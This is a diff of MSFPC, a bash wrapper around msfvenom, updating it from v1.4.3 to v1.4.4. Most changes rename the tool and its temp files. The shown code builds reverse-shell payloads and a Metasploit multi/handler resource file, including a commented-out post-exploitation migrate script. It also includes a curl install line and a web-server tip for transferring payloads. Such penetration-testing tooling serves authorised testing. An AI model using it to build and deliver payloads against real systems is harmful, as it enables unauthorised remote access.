@@ -1,6 +1,6 @@
 #!/bin/bash
 #-Metadata----------------------------------------------------#
-#  Filename: mpc.sh (v1.4.3)             (Update: 2016-06-30) #
+#  Filename: msfpc.sh (v1.4.4)           (Update: 2017-06-09) #
 #-Info--------------------------------------------------------#
 #  Quickly generate Metasploit payloads using msfvenom.       #
 #-Author(s)---------------------------------------------------#
@@ -28,7 +28,7 @@
 #-------------------------------------------------------------#
 
 #--Quick Install----------------------------------------------#
-#  curl -k -L "https://raw.githubusercontent.com/g0tmi1k/mpc/master/mpc.sh" > /usr/bin/mpc; chmod +x /usr/bin/mpc
+#  curl -k -L "https://raw.githubusercontent.com/g0tmi1k/mpc/master/msfpc.sh" > /usr/bin/msfpc; chmod +x /usr/bin/msfpc
 #-------------------------------------------------------------#
 
 #-More information--------------------------------------------#
@@ -119,7 +119,7 @@ function doAction {
   CMD=$(echo $CMD | sed 's/\\\\\n//g')
 
   [[ -e "${FILENAME}" ]] && echo -e " ${YELLOW}[i]${RESET} File (${FILENAME}) ${YELLOW}already exists${RESET}. ${YELLOW}Overwriting...${RESET}" && rm -f "${FILENAME}"
-  eval "${CMD}" 2>/tmp/mpc.out
+  eval "${CMD}" 2>/tmp/msfpc.out
   [[ ! -s "${FILENAME}" ]] && rm -f "${FILENAME}"
   if [[ -e "${FILENAME}" ]]; then
     echo -e " ${YELLOW}[i]${RESET} ${TYPE} ${SHELL} created: '${YELLOW}${FILENAME}${RESET}'"
@@ -127,22 +127,22 @@ function doAction {
     \chmod +x "${FILENAME}"
   else
     echo ""
-    \grep -q 'Invalid Payload Selected' /tmp/mpc.out 2>/dev/null
+    \grep -q 'Invalid Payload Selected' /tmp/msfpc.out 2>/dev/null
     if [[ "$?" == '0'  ]]; then
       echo -e "\n ${YELLOW}[i]${RESET} ${RED}Invalid Payload Selected${RESET} (Metasploit doesn't support this) =(" >&2
-      \rm -f /tmp/mpc.out
+      \rm -f /tmp/msfpc.out
     else
       echo -e "\n ${YELLOW}[i]${RESET} Something went wrong. ${RED}Issue creating file${RESET} =(." >&2
       echo -e "\n----------------------------------------------------------------------------------------"
       [ -e "/usr/share/metasploit-framework/build_rev.txt" ] && \cat /usr/share/metasploit-framework/build_rev.txt || \msfconsole -v
       \uname -a
       echo -e "----------------------------------------------------------------------------------------${RED}"
-      \cat /tmp/mpc.out
+      \cat /tmp/msfpc.out
       echo -e "${RESET}----------------------------------------------------------------------------------------\n"
     fi
     exit 2
   fi
-  #\rm -f /tmp/mpc.out
+  #\rm -f /tmp/msfpc.out
 
   [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET} File: $(\file -b ${FILENAME})"
   [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET} Size: $(\du -h ${FILENAME} | \cut -f1)"
@@ -155,13 +155,15 @@ function doAction {
 
   cat <<EOF > "${FILEHANDLE}"
 #
-# [Kali 2.x]:   systemctl start postgresql; msfdb start; msfconsole -q -r '${FILEHANDLE}'
+# [Kali 1]:   service postgresql start; service metasploit start; msfconsole -q -r '${FILEHANDLE}'
+# [Kali 2.x/Rolling]:   msfdb start; msfconsole -q -r '${FILEHANDLE}'
 #
 use exploit/multi/handler
 set PAYLOAD ${PAYLOAD}
 set ${HOST} ${IP}
 set LPORT ${PORT}
 set ExitOnSession false
+#set AutoRunScript 'post/windows/manage/migrate'
 run -j
 EOF
 
@@ -197,7 +199,7 @@ function doHelp {
   echo -e "   + ${YELLOW}Tomcat${RESET} [.${YELLOW}war${RESET}]"
   echo -e "   + ${YELLOW}Windows${RESET} [.${YELLOW}exe${RESET} // .${YELLOW}dll${RESET}]"
   echo ""
-  echo -e " Rather than putting <DOMAIN/IP>, you can do a interface and MPC will detect that IP address."
+  echo -e " Rather than putting <DOMAIN/IP>, you can do a interface and MSFPC will detect that IP address."
   echo -e " Missing <DOMAIN/IP> will default to the IP menu."
   echo ""
   echo -e " Missing <PORT> will default to 443."
@@ -244,7 +246,7 @@ function doHelp {
 
 
 ## Banner
-echo -e " ${BLUE}[*]${RESET} ${BLUE}M${RESET}sfvenom ${BLUE}P${RESET}ayload ${BLUE}C${RESET}reator (${BLUE}MPC${RESET} v${BLUE}1.4.3${RESET})"
+echo -e " ${BLUE}[*]${RESET} ${BLUE}MSF${RESET}venom ${BLUE}P${RESET}ayload ${BLUE}C${RESET}reator (${BLUE}MSFPC${RESET} v${BLUE}1.4.4${RESET})"
 
 
 ## Check system
@@ -786,7 +788,7 @@ fi
 
 ##### Done!
 if [[ "${SUCCESS}" == true ]]; then
-  echo -e " ${GREEN}[?]${RESET} ${GREEN}Quick web server${RESET} (for file transfer)?: python -m SimpleHTTPServer 8080"
+  echo -e " ${GREEN}[?]${RESET} ${GREEN}Quick web server${RESET} (for file transfer)?: python2 -m SimpleHTTPServer 8080"
   echo -e " ${BLUE}[*]${RESET} ${BLUE}Done${RESET}!"
 else
   doHelp
